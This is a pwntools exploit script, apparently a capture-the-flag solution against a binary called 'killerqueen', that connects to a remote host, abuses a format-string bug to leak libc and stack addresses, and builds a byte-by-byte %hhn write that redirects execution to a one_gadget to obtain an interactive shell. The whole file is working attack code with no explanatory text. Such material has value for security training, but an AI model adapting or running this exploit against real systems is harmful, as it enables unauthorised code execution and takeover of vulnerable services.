from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']
sh = remote('159.75.104.107', 30339)
# sh = process('./killerqueen')


# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc6_2.27-3ubuntu1.4_amd64.so')


def Write(Until, Text):
    sh.sendlineafter(Until, Text)

sh.recvuntil('X')
sh.recvuntil('X')
Write('\n', '0')
Rand = int(sh.recvuntil(':', drop = True))
log.success('Rand: ' + hex(Rand))

sleep(0.5)
sh.recvuntil('...\n')
Write('\n', 'a')

sleep(0.5)
sh.sendline('a')

Offset = 0xfffffffe - Rand
log.success('Offset: ' + hex(Offset))

sh.recvuntil('X')
sh.recvuntil('X')
Write('\n', '0' + str(Offset))
sleep(0.5)

# gdb.attach(sh, 'b * $rebase(0xc9e)')

sh.send('%p%38$p')
sh.recvuntil('...\n')
libcbase = int(sh.recv(14), 16) - libc.symbols['_IO_2_1_stdout_'] - 131
Stack_base = int(sh.recv(14), 16) - 0x28
Addr = libcbase + 0x619f68

# one = [0x45226, 0x4527a, 0xf0364, 0xf1207]
one = [0x4f3d5, 0x4f432, 0x10a41c] # 1.4
# one = [0x4f2c5, 0x4f322, 0x10a38c] # 1
# one = [0x4f365, 0x4f3c2, 0x10a45c] # 1.2
one_gadget = one[2] + libcbase

log.success('libcbase: ' + hex(libcbase))
log.success('Stack_base: ' + hex(Stack_base))
log.success('one_gadget: ' + hex(one_gadget))

sleep(0.5)

# gdb.attach(sh)
# cnt = int(one_gadget[-2:], 16)
# payload = '%' + str(cnt) + 'c%24$hhn'
# payload += '%124c%25$hhn'
cnt = 0

payload = ''

# payload += '%100c%9$hhn%63c%10$hhn'

for i in range(4):
    tmp = ((one_gadget & 0xff) - cnt) & 0xff
    cnt += tmp
    payload += '%' + str(tmp) + 'c'
    payload += '%' + str(12 + i) + '$hhn'
    one_gadget >>= 8

payload += (8 - (len(payload) & 0x7)) * 'a'

for i in range(4):
    payload += p64(Addr + i)

# payload = '%25c%22$n%24$n%25$n'

sleep(0.5)
sh.send(payload)
# sh.recvuntil('X')
# sh.recvuntil('X')
# Write('\n', str(Offset))
# Write('...\n', '%p%p%p%p%p%p%p%p%p%p%p%p')




sh.interactive()